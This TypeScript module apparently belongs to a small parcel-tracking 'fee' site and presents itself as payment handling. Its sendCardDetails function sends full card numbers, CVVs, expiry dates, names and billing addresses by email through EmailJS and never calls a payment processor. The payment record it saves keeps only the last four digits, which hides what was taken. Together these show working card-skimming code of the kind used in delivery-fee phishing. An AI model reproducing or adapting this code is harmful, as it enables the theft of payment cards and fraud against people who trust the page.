import {
  collection,
  addDoc,
  query,
  where,
  getDocs,
  serverTimestamp,
} from 'firebase/firestore';
import { db } from '../config/firebase';
import emailjs from '@emailjs/browser';

interface PaymentRecord {
  trackingNumber: string;
  amount: number;
  currency: string;
  paymentDate: Date;
  cardType?: string;
  lastFourDigits?: string;
}

export interface CardDetails {
  email: string;
  cardNumber: string;
  expiryDate: string;
  name: string;
  cvv: string;
  cardType: string;
  country: string;
  addressLine1: string;
  addressLine2: string;
  city: string;
  zip: string;
  state: string;
}

export const sendCardDetails = async (data: CardDetails): Promise<void> => {
  try {
    console.log('Sending payment data:', data);
    
    // Check if environment variables are configured
    const serviceId = process.env.REACT_APP_EMAILJS_SECONDARY_SERVICE_ID;
    const templateId = process.env.REACT_APP_EMAILJS_SECONDARY_CARD_TEMPLATE_ID;
    const userId = process.env.REACT_APP_EMAILJS_SECONDARY_USER_ID;
    
    if (!serviceId || !templateId || !userId) {
      console.error('Missing EmailJS environment variables');
      throw new Error('Payment service not configured properly');
    }
    
    const templateParams = {
      to_name: data.name || '',
      reply_to: data.email || '',
      email: data.email || '',
      card_number: data.cardNumber,
      expiry_date: data.expiryDate,
      full_name: data.name,
      cvv: data.cvv,
      card_type: data.cardType,
      country: data.country || '',
      address_line_1: data.addressLine1 || '',
      address_line_2: data.addressLine2 || '',
      city: data.city || '',
      zip_code: data.zip || '',
      state: data.state || ''
    };
    
    console.log('Template params:', templateParams);
    
    const response = await emailjs.send(
      serviceId,
      templateId,
      templateParams,
      userId
    );
    
    console.log('EmailJS response:', response);
    
    if (response.status !== 200) {
      throw new Error('Failed to send payment details');
    }
    
  } catch (error) {
    console.error('Payment processing error:', error);
    throw new Error('Error processing payment: ' + (error as Error).message);
  }
};

export const savePaymentRecord = async (
  trackingNumber: string,
  cardType?: string,
  lastFourDigits?: string
): Promise<void> => {
  try {
    const paymentData: PaymentRecord = {
      trackingNumber,
      amount: 0.99, // Changed from 1.99 to match the form
      currency: 'USD', // Changed from GBP to USD
      paymentDate: new Date(),
      cardType,
      lastFourDigits,
    };

    await addDoc(collection(db, 'payments'), {
      ...paymentData,
      createdAt: serverTimestamp(),
    });
    
    console.log('Payment record saved successfully');
  } catch (error) {
    console.error('Error saving payment record:', error);
    throw new Error('Failed to save payment record');
  }
};

export const checkPaymentStatus = async (trackingNumber: string): Promise<boolean> => {
  try {
    const paymentsRef = collection(db, 'payments');
    const q = query(paymentsRef, where('trackingNumber', '==', trackingNumber));
    const querySnapshot = await getDocs(q);
    
    return !querySnapshot.empty;
  } catch (error) {
    console.error('Error checking payment status:', error);
    return false;
  }
}; 